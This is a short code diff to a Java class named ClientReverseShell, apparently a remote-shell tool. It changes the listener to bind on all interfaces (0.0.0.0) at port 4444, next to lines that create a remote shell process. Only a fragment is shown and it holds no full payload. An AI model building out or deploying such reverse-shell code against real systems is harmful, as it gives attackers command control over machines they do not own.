@@ -17,7 +17,7 @@ public class ClientReverseShell {
 
         Process remoteShell;
         byte[] buffer = new byte[1024];
-        InetSocketAddress serverAddress = new InetSocketAddress(4444);
+        InetSocketAddress serverAddress = new InetSocketAddress("0.0.0.0", 4444);
 
         try {
             String prompt = null;
